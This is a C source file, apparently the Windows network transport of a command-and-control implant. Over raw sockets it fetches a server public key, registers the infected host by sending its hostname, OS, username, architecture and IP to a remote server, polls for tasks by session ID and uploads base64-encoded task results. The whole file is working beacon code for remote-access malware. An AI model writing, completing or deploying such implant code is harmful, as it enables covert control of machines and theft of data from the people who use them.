#include "transport.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "../shared/base64.h"

#pragma comment(lib, "ws2_32.lib")

static char server_host[256] = {0};
static int server_port = 0;

int transport_init(const char *host, int port) {
    if (!host) return -1;

    strncpy(server_host, host, sizeof(server_host) - 1);
    server_port = port;
    
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return -1;
    }
    
    return 0;
}

void transport_cleanup(void) {
    WSACleanup();
}

/* Helper: HTTP request using raw TCP sockets */
static char *http_request(const char *method, const char *path, const char *body) {
    struct addrinfo *result = NULL, *ptr = NULL, hints = {0};
    SOCKET hSocket = INVALID_SOCKET;
    char port_str[16];
    char *response = NULL;

    printf("[DEBUG] HTTP %s %s (host=%s:%d)\n", method, path, server_host, server_port);

    snprintf(port_str, sizeof(port_str), "%d", server_port);

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    /* Resolve server address */
    printf("[DEBUG] Resolving %s:%s...\n", server_host, port_str);
    if (getaddrinfo(server_host, port_str, &hints, &result) != 0) {
        printf("[DEBUG] getaddrinfo failed\n");
        return NULL;
    }
    printf("[DEBUG] Resolved successfully\n");
    
    /* Connect to server */
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        hSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (hSocket == INVALID_SOCKET) {
            printf("[DEBUG] Socket creation failed\n");
            continue;
        }
        printf("[DEBUG] Socket created\n");

        if (connect(hSocket, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            printf("[DEBUG] Connect failed: %d\n", WSAGetLastError());
            closesocket(hSocket);
            hSocket = INVALID_SOCKET;
            continue;
        }
        printf("[DEBUG] Connected successfully\n");
        break;
    }
    
    freeaddrinfo(result);
    
    if (hSocket == INVALID_SOCKET) {
        return NULL;
    }
    
    /* Build HTTP request */
    char request[S0P_MAX_PAYLOAD];
    int body_len = body ? strlen(body) : 0;

    /* Extract hostname without port for Host header */
    char host_only[256];
    strncpy(host_only, server_host, sizeof(host_only) - 1);
    char *colon = strchr(host_only, ':');
    if (colon) {
        *colon = '\0';  /* Remove :port from Host header */
    }

    int req_len = snprintf(request, sizeof(request),
        "%s %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n%s",
        method, path, host_only, body_len, body ? body : "");
    
    /* Send request */
    printf("[DEBUG] Sending %d bytes...\n", req_len);
    int sent = send(hSocket, request, req_len, 0);
    if (sent == SOCKET_ERROR) {
        printf("[DEBUG] Send failed: %d\n", WSAGetLastError());
        closesocket(hSocket);
        return NULL;
    }
    printf("[DEBUG] Sent %d bytes\n", sent);

    /* Receive response */
    response = malloc(S0P_MAX_PAYLOAD);
    if (!response) {
        closesocket(hSocket);
        return NULL;
    }

    int total = 0;
    int bytes;
    char buffer[4096];

    printf("[DEBUG] Receiving response...\n");
    while ((bytes = recv(hSocket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        printf("[DEBUG] Received %d bytes\n", bytes);
        if (total + bytes < S0P_MAX_PAYLOAD) {
            memcpy(response + total, buffer, bytes);
            total += bytes;
        }
    }
    printf("[DEBUG] Total received: %d bytes\n", total);
    response[total] = '\0';
    
    closesocket(hSocket);
    
    /* Extract body from HTTP response (skip headers) */
    char *body_start = strstr(response, "\r\n\r\n");
    if (body_start) {
        body_start += 4;
        printf("[DEBUG] Response body (first 200 chars): %.200s\n", body_start);
        char *result = malloc(strlen(body_start) + 1);
        if (result) {
            strcpy(result, body_start);
        }
        free(response);
        return result;
    }

    printf("[DEBUG] No body found, full response: %.200s\n", response);
    return response;
}

/* GET /pubkey */
char *transport_get_pubkey(void) {
    return http_request("GET", "/pubkey", NULL);
}

/* POST /register */
char *transport_register(const char *encrypted_key, const host_info_t *host) {
    if (!encrypted_key || !host) return NULL;

    char body[S0P_MAX_PAYLOAD];
    snprintf(body, sizeof(body),
        "{"
        "\"encrypted_key\":\"%s\","
        "\"host_info\":{"
        "\"hostname\":\"%s\","
        "\"os\":\"%s\","
        "\"username\":\"%s\","
        "\"arch\":\"%s\","
        "\"ip\":\"%s\""
        "}"
        "}",
        encrypted_key,
        host->hostname, host->os, host->username,
        host->arch, host->ip);

    return http_request("POST", "/register", body);
}

/* GET /tasks/{session_id} */
char *transport_fetch_tasks(const char *session_id) {
    if (!session_id) return NULL;

    char path[512];
    snprintf(path, sizeof(path), "/tasks/%s", session_id);
    return http_request("GET", path, NULL);
}

/* POST /results/{session_id} */
int transport_submit_result(const char *session_id, const char *nonce,
                            const char *payload, const char *tag) {
    if (!session_id || !nonce || !payload || !tag) return -1;

    char path[512];
    snprintf(path, sizeof(path), "/results/%s", session_id);

    /* Encode payload as base64 to avoid JSON escaping issues */
    char *payload_b64 = base64_encode((uint8_t *)payload, strlen(payload));
    if (!payload_b64) {
        printf("[-] Base64 encoding failed\n");
        return -1;
    }

    char body[S0P_MAX_PAYLOAD];
    snprintf(body, sizeof(body),
        "{"
        "\"nonce\":\"%s\","
        "\"payload\":\"%s\","
        "\"tag\":\"%s\""
        "}",
        nonce, payload_b64, tag);

    printf("[*] Sending result: %s\n", path);
    printf("[DEBUG] Body: %.200s\n", body);

    char *response = http_request("POST", path, body);
    int ret = (response != NULL) ? 0 : -1;

    if (response) {
        printf("[+] Result submission ACK: %.100s\n", response);
    } else {
        printf("[-] Result submission FAILED\n");
    }

    free(response);
    free(payload_b64);
    return ret;
}
